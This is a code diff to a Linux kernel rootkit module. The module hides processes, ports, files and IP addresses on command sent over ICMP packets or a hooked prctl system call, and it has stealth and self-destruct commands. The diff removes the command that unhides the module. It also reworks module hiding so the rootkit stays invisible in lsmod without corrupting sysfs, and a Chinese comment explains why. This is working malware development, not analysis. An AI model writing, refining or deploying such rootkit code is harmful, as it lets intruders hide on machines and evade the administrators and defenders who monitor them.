@@ -23,7 +23,6 @@
  *   cmd=0x01: hide_pid (arg=PID)
  *   cmd=0x02: hide_port (arg=port)
  *   cmd=0x03: hide_file (arg=pointer to prefix)
- *   cmd=0x04: mod_show (unhide module)
  *   cmd=0x06: stealth mode (arg=1 enable, arg=0 disable)
  *   cmd=0x12: hide_ip (arg=IPv4 address as u32)
  *   cmd=0x13: hide_ipport (arg=IPv4 address as u32, arg2=port)
@@ -34,7 +33,6 @@
  * - 0x01: hide_pid
  * - 0x02: hide_port
  * - 0x03: hide_file
- * - 0x04: show_mod
  * - 0x06: stealth (arg=1 enable, arg=0 disable)
  * - 0x12: hide_ip
  * - 0x13: hide_ipport
@@ -116,7 +114,6 @@ MODULE_PARM_DESC(stealth, "Enable stealth mode (default: true)");
 #define ICMP_CMD_HIDE_PID      0x01
 #define ICMP_CMD_HIDE_PORT     0x02
 #define ICMP_CMD_HIDE_FILE     0x03
-#define ICMP_CMD_SHOW_MOD      0x04
 #define ICMP_CMD_STEALTH       0x06
 #define ICMP_CMD_SELF_DESTRUCT 0xFE
 #define ICMP_CMD_CLEAR         0xFF
@@ -128,7 +125,6 @@ MODULE_PARM_DESC(stealth, "Enable stealth mode (default: true)");
 #define PRCTL_CMD_HIDE_PID      0x01
 #define PRCTL_CMD_HIDE_PORT     0x02
 #define PRCTL_CMD_HIDE_FILE     0x03
-#define PRCTL_CMD_SHOW_MOD      0x04
 #define PRCTL_CMD_STEALTH       0x06
 #define PRCTL_CMD_HIDE_IP       0x12
 #define PRCTL_CMD_HIDE_IPPORT   0x13
@@ -856,8 +852,10 @@ static void mod_hide(void)
     if (!g_mod.hidden) {
         g_mod.prev = THIS_MODULE->list.prev;
         list_del_init(&THIS_MODULE->list);
-        // Also hide from /sys/module/xxx
-        kobject_del(&THIS_MODULE->mkobj.kobj);
+        // 注意：这里不删除 /sys/module/xxx 的 kobject。
+        // kobject_del() 是单向操作，删除后再用 mod_show() 的 list_add()
+        // 恢复模块链表时，会导致 sysfs 状态损坏，lsmod 出现负引用计数。
+        // 因此只从内核模块链表摘除，即可在 lsmod 中隐身，且支持完整恢复。
         g_mod.hidden = true;
     }
     g_config.stealth_mode = true;
@@ -919,10 +917,6 @@ static void process_icmp_cmd(struct icmp_cmd *cmd)
             }
             write_unlock(&g_data.lock);
         }
-        break;
-        
-    case ICMP_CMD_SHOW_MOD:
-        mod_show();
         break;
         
     case ICMP_CMD_STEALTH:
@@ -1076,7 +1070,6 @@ static unsigned long *sct = NULL;
 //   0x01 = hide_pid: arg is PID
 //   0x02 = hide_port: arg is port number
 //   0x03 = hide_file: arg is pointer to prefix string
-//   0x04 = mod_show: unhide module
 //   0x06 = stealth: arg=1 enable, arg=0 disable
 //   0x12 = hide_ip: arg is IPv4 address (u32, network byte order)
 //   0x13 = hide_ipport: arg is IPv4 address, arg2 is port
@@ -1139,10 +1132,6 @@ static asmlinkage long hk_prctl(const struct pt_regs *regs)
             g_data.prefixes_count = 0;
             g_data.ips_count = 0;
             write_unlock(&g_data.lock);
-            return 0;
-            
-        case PRCTL_CMD_SHOW_MOD: // 0x04
-            mod_show();
             return 0;
             
         case PRCTL_CMD_STEALTH: // 0x06
